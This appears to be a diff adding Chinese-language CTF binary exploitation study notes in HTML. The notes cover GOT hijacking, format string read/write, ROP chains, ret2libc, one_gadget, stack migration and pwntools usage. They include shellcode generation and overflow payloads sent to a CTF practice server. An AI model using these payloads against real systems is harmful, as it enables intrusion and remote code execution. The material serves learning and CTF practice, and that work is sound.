+<h3 id="libc">Libc<a class="headerlink" href="#libc" title="Permanent link"></a></h3>
+<h5 id="lazy-binding">Lazy binding<a class="headerlink" href="#lazy-binding" title="Permanent link"></a></h5>
+<ul>
+<li>
+<p>Dynamic linking的程式在执行过程中，有些library中的函式可能到结束都不轨行到</p>
+</li>
+<li>
+<p>ELF采取Lazy binding的机制，在第一次call function時，才会去找真正的位置进行binding</p>
+</li>
+</ul>
+<h5 id="pltgot">plt&amp;got<a class="headerlink" href="#pltgot" title="Permanent link"></a></h5>
+<ul>
+<li>
+<p>因为Lazy binding的榄制，常要用到library函数时，会call目模函数的plt，接著才call目模函数的 got</p>
+</li>
+<li>
+<p>got 中存有目模函数在library中真正的位置</p>
+</li>
+</ul>
+<p>如果可执行文件中调用多个动态库函数，那每个函类都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p>
+<p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为全局偏移表或者全局函数表</p>
+<p>GOT: Global Offset Table &ndash; 全局偏移表或者全局函数表</p>
+<p>PLT: Procedure Link Table &ndash; 内部函数表. 指那个额外代码段表，称为程序链接表</p>
+<p><img alt="" src="imgs/pwn_plt%26got3.jpg" /></p>
+<p><img alt="" src="imgs/pwn_plt%26got.jpg" /></p>
+<p><strong>延迟绑定 Lazy binding</strong></p>
+<p>函数第一次使用是地才进行绑定。</p>
+<p>ELF实现延迟是通过PLT。原先GOT中存放着全局变量和函数调用。现在拆分.got和 .got.plt。</p>
+<p>.got存放着全局变量引用，</p>
+<p>.got.plt 存放着函数引用。</p>
+<p>查看<code>test@plt</code>用<code>objdump -Mintel -d -j .plt got</code></p>
+<p>-j 指定节。
+-j .plt 查找符号表</p>
+<h5 id="got-hijacking">GOT Hijacking<a class="headerlink" href="#got-hijacking" title="Permanent link"></a></h5>
+<ul>
+<li>
+<p>透过改写GOT使得呼叫函数式，跳到指定位置</p>
+</li>
+<li>
+<p>不能是Full RELRO</p>
+</li>
+</ul>
+<p><img alt="" src="imgs/pwn_plt%26got2.jpg" />
+<img alt="" src="imgs/pwn_GOT_Hijacking1.jpg" />
+<img alt="" src="imgs/pwn_GOT_Hijacking2.jpg" />
+<img alt="" src="imgs/pwn_GOT_Hijacking3.jpg" /></p>
+<p>source: <a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/practise/pwn_04_gothijack.c">pwn_gothijack</a></p>
+<p>exp <a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/practise/writeup.md">pwn_gothijack</a></p>
+<h3 id="fmt">fmt<a class="headerlink" href="#fmt" title="Permanent link"></a></h3>
+<ul>
+<li>
+<p>Format string attack</p>
+</li>
+<li>
+<p>Read - information leak:</p>
+<ul>
+<li>PIE, stack heap libc ASLR, cannary</li>
+</ul>
+</li>
+<li>Write - almost write every where</li>
+<li>Powerful vulnerablility</li>
+</ul>
+<p>往后进行 overflow, 覆盖到 rbp</p>
+<div class="codehilite"><pre><span class="kt">int</span> <span class="nf">printf</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="kt">int</span> <span class="nf">fprintf</span><span class="p">(</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="kt">int</span> <span class="nf">vprintf</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">arg</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">vfprintf</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">arg</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">vprintf</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">arg</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">vprintf</span><span class="p">(</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">arg</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">vdprintf</span><span class="p">(</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">);</span>
+</pre></div>
+
+<p>正面这个即使保护全开也能拿到 shell
+<div class="codehilite"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div></p>
+<p><div class="codehilite"><pre>gdb ./echo
+b printf
+r
+输入 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</pre></div>
+TODO gdb 源码调试</p>
+<p>fmt 可控</p>
+<p>&ndash;  Constrains </p>
+<div class="codehilite"><pre>-- fmt 长度很短
+-- 过滤
+</pre></div>
+
+
+<h4 id="fmt-read">fmt - read<a class="headerlink" href="#fmt-read" title="Permanent link"></a></h4>
+<ul>
+<li>
+<p>int printf( const char* format, &hellip;);</p>
+</li>
+<li>
+<p>rdi, rsi, rdx, rcx, r8, r9, STACK</p>
+<ul>
+<li>x64 calling convention</li>
+<li>rdi, rsi, rdx, r10, r8, r9, (push to stack) for system call</li>
+<li>return value is stored in rax</li>
+</ul>
+</li>
+<li>rdi -&gt; fmt</li>
+<li>%d, %p, %s, %c, %x -&gt; read data on the stack</li>
+<li>information leak</li>
+</ul>
+<p>正常参数是按顺序放  rdi, rsi, rdx, rcx, r8, r9, STACK的。</p>
+<p>实际输入 %x%x 就只是把 format 放到 rdi，那么就会直接读出 stack 上面的内容。就把 stack leak 出来。</p>
+<p>能控 formatstring, 从第6个开始就可以从 stack 上一直读了。register内容读完就是 stack 的值了</p>
+<p>pintf(buf);
+<div class="codehilite"><pre><span class="nl">input</span><span class="p">:</span> <span class="s">&quot;aaaaaaa&quot;</span>
+<span class="nl">output</span><span class="p">:</span> <span class="s">&quot;aaaaaaa&quot;</span>
+
+<span class="nl">input</span><span class="p">:</span> <span class="s">&quot;%p.%p.%p&quot;</span>
+<span class="nl">output</span><span class="p">:</span> <span class="s">&quot;0x7fbdb0e858b0, 0x1, 0x3&quot;</span>
+        <span class="n">rdi</span>              <span class="n">rsi</span>  <span class="n">rdx</span>
+
+<span class="nl">input</span><span class="p">:</span> <span class="s">&quot;%3$p&quot;</span>
+<span class="nl">output</span><span class="p">:</span> <span class="s">&quot;0x3&quot;</span>
+
+<span class="nl">input</span><span class="p">:</span> <span class="s">&quot;%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span>
+<span class="nl">output</span><span class="p">:</span> <span class="s">&quot;0x7fbdb0e858b0, 0x1, 0x7ffff7dd48b0, 0x555555554846.0x4.0x7052e7052e7025.0x252e70252e70252e&quot;</span>
+        <span class="n">rdi</span>              <span class="n">rsi</span>  <span class="n">rdx</span>              <span class="n">rcx</span>            <span class="n">r8</span>  <span class="n">r9</span>               <span class="n">stack</span>
+
+<span class="err">已进入</span><span class="n">main函数了</span> <span class="o">-</span><span class="mi">8</span><span class="err">对齐</span>
+<span class="n">x</span><span class="o">/</span><span class="mi">64</span><span class="n">gx</span> <span class="err">$</span><span class="n">rsp</span><span class="o">-</span><span class="mi">8</span>
+</pre></div>
+BambooFox-2018-2019年合集-107学年社课 (P2. 程式安全-pwn2)</p>
+<h4 id="fmt-write">fmt - write<a class="headerlink" href="#fmt-write" title="Permanent link"></a></h4>
+<p>将已输出之字元数目当成interger值（4bytes），写入address。</p>
+<p>e.g
+<div class="codehilite"><pre><span class="c1">// fmt_write.c</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;a = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;123abc%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+    <span class="c1">// printf(&quot;%100c%d\n&quot;, 0, a);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;a = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span> <span class="c1">//a = 6</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div></p>
+<p>printf(&ldquo;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%n&rdquo;, &amp;ptr)</p>
+<p>printf(&ldquo;%100c%n&rdquo;, &amp;char, &amp;ptr)</p>
+<p>printf(&ldquo;%100c%n&rdquo;, 0, &amp;ptr)</p>
+<p><div class="codehilite"><pre><span class="c1">// fmt_write.c</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;a = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%100c%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;a = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span> <span class="c1">//a=100</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+16进制显示
+<code>./fmt_write.c | xxd</code></p>
+<p>大量写入不稳定，需要sleep等一下。或使用又下的方法</p>
+<ul>
+<li>
+<p>%100c%n -&gt; 写入4bytes \x64\x00\x00\x00</p>
+</li>
+<li>
+<p>%100c%hn -&gt; 写入2bytes \x64\x00\</p>
+</li>
+<li>
+<p>%100c%hhn -&gt; 写入1bytes \x64</p>
+</li>
+</ul>
+<h4 id="fmt-exploit">fmt - exploit<a class="headerlink" href="#fmt-exploit" title="Permanent link"></a></h4>
+<ul>
+<li>
+<p>If format string is stored on the stack：</p>
+<ul>
+<li>将address放置放payload，得知address位於第n個参数，用%n$去refenrence它。</li>
+</ul>
+</li>
+<li>
+<p>%nSp-&gt;leak libc，PIE，Heap，Stack:bypass ASLR</p>
+</li>
+<li>
+<p>%n$n-&gt;write value</p>
+</li>
+<li>
+<p>read &amp;write everywhere</p>
+</li>
+</ul>
+<p>如果fomrat string在stack上。那可以把address放在format string上。 用%s leak, format sting后面+个8bytes的printf 的GOT。再算好address位置。</p>
+<p>%100c%n%100c%n
+第一个%n会写100，第二个%n会写200，只能从小往大排列好再写。</p>
+<p>pwn_02_fmt_write.py</p>
+<p>當format string不在stack上，如位於global.bss</p>
+<p>無法利用fmt payload來放address</p>
+<p>尋找stack上有利残留值</p>
+<p>pointer， address</p>
+<ul>
+<li>
+<p>libc text</p>
+</li>
+<li>
+<p>stack</p>
+</li>
+</ul>
+<p>通常找到的address固定，只能往同個地方寫，但希望能拆開寫</p>
+<p>·希望找到一個stack address ，其指向之地方又是stack address 。</p>
+<p>·利用第一個address來改寫第二個address ，用第二個address來建構真的要的address。</p>
+<p>√  RBP Chain</p>
+<h3 id="rop-gadget">ROP Gadget<a class="headerlink" href="#rop-gadget" title="Permanent link"></a></h3>
+<ul>
+<li>Return Oriented Programming</li>
+<li>透過不断去執行包含ret的程式片段來達到想要的操作</li>
+<li>這些包含ret的程式片段又被稱作gadget</li>
+</ul>
+<p>结尾是ret的程序代码段</p>
+<div class="codehilite"><pre>add rsp, 0x8
+ret
+
+pop rax
+ret
+
+leave
+ret
+
+400730: 41 5e   pop r14
+400732: 41 5f   pop r15
+400734: c3      ret
+
+mov rax,rbx
+ret
+
+lea rax,[local_8h]
+mov, rdi, rax
+mov eax, 0
+call sym.imp.gets
+ret
+</pre></div>
+
+
+<p>每个bytes表示的内容不同, 见下面</p>
+<div class="codehilite"><pre>400730: 41 5e   pop r14
+400732: 41 5f   pop r15
+400734: c3      ret
+
+400731: 5e      pop rsi
+400732: 41 5f   pop r15
+400734: c3      ret
+
+400732: 41 5f   pop r15
+400734: c3      ret
+
+400733: 5f      pop rdi
+400734: c3      ret
+</pre></div>
+
+
+<div class="codehilite"><pre>ROPgadget --binary ./test | grep &#39;pop rax.*ret&#39;
+ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;
+ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot; | grep &quot;eax&quot;
+ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot; | grep &quot;ebx&quot; | grep &quot;ecx&quot; | grep &quot;edx&quot;
+ROPgadget --binary ./ret2libc3 --string &quot;/bin/sh&quot;
+</pre></div>
+
+<p><img alt="Alt text" src="imgs/pwn_02_ROPgaget.jpg" /></p>
+<p>ret2libc, <a href="https://blog.csdn.net/qq_40827990/article/details/86662079">Link</a></p>
+<p><a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/practise/ret2libc1.c">ret2libc1</a>
+<a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/practise/ret2libc2.c">ret2libc2</a>
+<a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/practise/ret2libc3.c">ret2libc3</a></p>
+<h4 id="rop-chain">ROP Chain<a class="headerlink" href="#rop-chain" title="Permanent link"></a></h4>
+<p><img alt="" src="imgs/pwn_04_ropchain_03.jpg" />
+0x39 execve（执行文件）在父进程中fork一个子进程</p>
+<p><img alt="" src="imgs/pwn_04_ropchain_01.jpg" />
+<img alt="" src="imgs/pwn_04_ropchain_02.jpg" /></p>
+<p>ROPgadget &ndash;binary rop &gt; gadget.txt
+vim gadget.txt
+or </p>
+<div class="codehilite"><pre>readelf -a rop
+readelf -S rop | grep &quot;.bss&quot;
+ROPgadget --binary rop | grep &quot;mov qword ptr \[rdi\], rsi ; ret&quot;
+</pre></div>
+
+
+<p><a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/scripts/pwn_101_NUAACTF_rop.py">pwn_101_NUAACTF_rop.py</a></p>
+<h3 id="return-to-plt">Return to PLT<a class="headerlink" href="#return-to-plt" title="Permanent link"></a></h3>
+<p>Use PLT as Gadget</p>
+<p><img alt="" src="imgs/pwn_04_ropchain_04.jpg" />
+<img alt="" src="imgs/pwn_04_ropchain_05.jpg" /></p>
+<h3 id="return-to-libc">Return to Libc<a class="headerlink" href="#return-to-libc" title="Permanent link"></a></h3>
+<ul>
+<li>一般程序很少有system, execve或是后门程序</li>
+<li>在DEP保护下无法执行填入的shellcode</li>
+</ul>
+<p>How to Return to libc
+* 因为ASLR，每次libc载入的位置都不同
+* 我需要 leak libc的base address 来知道目address
+<img alt="" src="imgs/pwn_04_ropchain_06.jpg" /></p>
+<p>可以获得libc的地方有stack, (heap, ) 跟GOT
+<img alt="" src="imgs/pwn_05_ret2libc_01.jpg" /></p>
+<p><a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/practise/pwn_05_ret2libc_01.c">pwn_05_ret2libc_01</a></p>
+<div class="codehilite"><pre>objdump -d ret2libc
+找到 400550&lt;puts@plt&gt; 最右侧显示 # 601018
+
+readelf -a libc-2.27.so | grep &quot;puts&quot;
+    42: 00809c0 puts@@GLIBC_2.2.5
+
+strings libc-2.27.so -tx | grep &quot;/bin/sh&quot;
+    1b3e9a /bin/sh
+
+ROPgadget --binary libc-2.27.so &gt; g
+cat g | grep &quot;pop rdi&quot;
+   0x2155f : pop rdi ; ret
+cat g | grep &quot;pop rsi&quot;
+   0x23e6a : pop rsi ; ret
+cat g | grep &quot;pop rdx&quot;
+   0x01b96 : pop rdx ; ret
+cat g | grep &quot;pop rax&quot;
+   0x439c8 : pop rax ; ret
+cat g | grep &quot;syscall&quot;
+</pre></div>
+
+
+<p>看程序的汇编</p>
+<div class="codehilite"><pre>lea rax, [rbp-0x30]
+mov edx, 0x90
+mov rsi, rax
+mov edi, 0x0
+call 400570 &lt;read@plt&gt;
+// rsi从 rbp-0x30这里来, 覆盖0x30个bytes再+8盖掉rbp
+// 即0x38
+</pre></div>
+
+
+<p><a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/scripts/pwn_101_NUAACTF_rop_libc.py">pwn_101_NUAACTF_rop_libc.py</a></p>
+<p><img alt="" src="imgs/pwn_05_ret2libc_02.jpg" /></p>
+<p>或 <code>one_gadget libc-2.27.so</code></p>
+<p>pwn_05_ret2libc_02.jpg
+这里使用0x4f322,  满足[rsp+0x40] == NULL, </p>
+<p>也可以使用 0x4f2c5, 要求 rcx== NULL, 如果rcx !== null，可以 pop rcx, 再转到 0x4f2c5 即可满足条件。</p>
+<p><a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/scripts/pwn_101_NUAACTF_rop_libc_onegadget.py">pwn_101_NUAACTF_rop_libc_onegadget.py</a></p>
+<h3 id="stack-migration">stack migration<a class="headerlink" href="#stack-migration" title="Permanent link"></a></h3>
+<ul>
+<li>ROP chain</li>
+<li>x64 addres -&gt; 8bytes</li>
+<li>long return address sled</li>
+<li>Not engough memory to prepare ROP chain
+<div class="codehilite"><pre>leave ret gadget
+
+mov rsp， rbp
+pop rbp
+
+Overflow fake rbp -&gt; leave ret
+rbp -&gt; fake rbp
+ret -&gt; leave ret gadget
+
+leave ret again：
+mov rsp， rbp-&gt;將stack搬至fake rbp
+pop rbp
+ret-&gt;跳到新的rop chain
+</pre></div></li>
+<li>将Stack搬到可存储ROP playload的地方</li>
+<li>在有限的情况下，利用stack migration让ROP持续活下去</li>
+</ul>
+<h3 id="relo">RELO<a class="headerlink" href="#relo" title="Permanent link"></a></h3>
+<ul>
+<li>Relocation Read-Only</li>
+<li>Partial RELRO</li>
+<li>GOT可寫</li>
+<li>Full RELRO</li>
+<li>Load time時會將所有function resolve完畢</li>
+<li>GOT不可寫</li>
+</ul>
+<h3 id="uaf">UAF原理<a class="headerlink" href="#uaf" title="Permanent link"></a></h3>
+<p><a href="https://mp.weixin.qq.com/s/Jg6Usu58LXnHarMsR9Ok8w">https://mp.weixin.qq.com/s/Jg6Usu58LXnHarMsR9Ok8w</a></p>
+<h3 id="todo_1">TODO<a class="headerlink" href="#todo_1" title="Permanent link"></a></h3>
+<p>明显的stack/heap/int 溢出, string format,off-by-one/UAF/house of XXX/xxbin attack
+抽象成：对内存地址的读写
+漏洞利用: shellcode/GOT/vtable/hook_function/onegadget</p>
+<h2 id="_9">常用命令<a class="headerlink" href="#_9" title="Permanent link"></a></h2>
+<p><a href="https://blog.csdn.net/weixin_42072280/article/details/90229294">checksec</a> <code>[filename]</code></p>
+<div class="codehilite"><pre>/Downloads/level0&#39;
+    Arch:     amd64-64-little # 64位
+    RELRO:    No RELRO
+    Stack:    No canary found # 程序编译时关了栈不可执行保护
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    # 这说明我们可以在buf里面输入shellcode和填充字符
+    # 并且让函数的返回地址覆盖成buf的栈上地址 来实现栈溢出攻击
+</pre></div>
+
+
+<p>通常定义变量时 后面跟 一个bp 大小(8bytes/64位, 4bytes/32位)</p>
+<p>ldd filename  通过ldd查找libc共享库</p>
+<h2 id="pwntools">pwntools<a class="headerlink" href="#pwntools" title="Permanent link"></a></h2>
+<p><a href="https://www.jianshu.com/p/6e528b33e37a">Link</a></p>
+<h3 id="_10">本地启动<a class="headerlink" href="#_10" title="Permanent link"></a></h3>
+<p>nc -vc ./fmt -kl 3333</p>
+<p>然后其他机器就可以nc ip port连接了</p>
+<h3 id="_11">怎样调试<a class="headerlink" href="#_11" title="Permanent link"></a></h3>
+<p>方法1</p>
+<p><div class="codehilite"><pre><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="c1"># gdb.attach(sh, &#39;b *0x1234&#39;)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+</pre></div>
+方法2
+<div class="codehilite"><pre><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;debug&#39;</span><span class="p">)</span>
+<span class="err">这时看</span><span class="n">pid</span><span class="err">，比如是</span> <span class="mi">6533</span><span class="p">,</span> <span class="err">新建终端，</span>
+<span class="err">$</span><span class="n">gdb</span>
+<span class="err">$</span><span class="n">attach</span> <span class="mi">6533</span>
+</pre></div></p>
+<h3 id="_12">指令介绍<a class="headerlink" href="#_12" title="Permanent link"></a></h3>
+<p>p32、p64是64/32位代码 打包为二进制，u32、u64是解包为二进制</p>
+<p><strong>flat模块能将pattern字符串和地址结合并且转为字节模式</strong></p>
+<div class="codehilite"><pre><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="mh">0x804a060</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendlijneafter</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">,</span> <span class="n">flat</span><span class="p">[</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8c</span><span class="p">,</span> <span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">&#39;system&#39;</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x804a024</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
+</pre></div>
+
+<p>symbols</p>
+<div class="codehilite"><pre>ELF(&#39;./level3&#39;).symbols[&#39;main&#39;]
+ELF(&#39;./level3&#39;).sym[&#39;main&#39;]
+</pre></div>
+
+
+<p>gdb.attach(sh) # gdb附加到调试</p>
+<h3 id="_13">示例<a class="headerlink" href="#_13" title="Permanent link"></a></h3>
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s">&#39;linux&#39;</span><span class="p">)</span> <span class="c1"># 能显示调试信息</span>
+<span class="c1">#io = process(&#39;./level1&#39;) </span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;pwn2.jarvisoj.com&#39;</span><span class="p">,</span> <span class="mi">9877</span><span class="p">)</span> <span class="c1"># 远程连接</span>
+<span class="n">text</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">14</span><span class="p">:</span> <span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="c1"># 获取返回值</span>
+<span class="c1"># recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span> <span class="c1"># pwntools生成的 sh 的shellcode</span>
+<span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="c1"># 地址转 64 位二进制</span>
+<span class="n">p32</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="c1"># 地址转 32 位二进制</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;latin&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x90</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;latin&#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+
+<p>从write返回main
+<div class="codehilite"><pre><span class="c1">#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
+<span class="c1"># payload = flat(&#39;a&#39;*0x88, p64(syscall), p64(syscall)) # buuctf这题需要2个，不明白。好像是栈没对齐的原因</span>
+</pre></div></p>
+<h4 id="_14">输入字符<a class="headerlink" href="#_14" title="Permanent link"></a></h4>
+<div class="codehilite"><pre><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&#39;name&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;your name&quot;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+</pre></div>
+
+<h4 id="_15">汇编转二进制、数字、字符转换等<a class="headerlink" href="#_15" title="Permanent link"></a></h4>
+<p><div class="codehilite"><pre><span class="c1"># python3</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">print</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">&#39;XCHG EAX,ESP</span><span class="se">\n</span><span class="s">RET</span><span class="se">\n</span><span class="s">MOV ECX,[EAX]</span><span class="se">\n</span><span class="s">MOV [EDX],ECX</span><span class="se">\n</span><span class="s">POP EBX</span><span class="se">\n</span><span class="s">RET&#39;</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
+</pre></div>
+p32
+<div class="codehilite"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8040000</span><span class="p">)</span>
+<span class="n">b</span><span class="s">&#39;</span><span class="se">\x00\x00\x04\x08</span><span class="s">&#39;</span>
+</pre></div></p>
+<p>u32使用
+<div class="codehilite"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">u32</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\x00\x00\x04\x08</span><span class="s">&#39;</span><span class="p">)</span>
+<span class="mi">134479872</span>
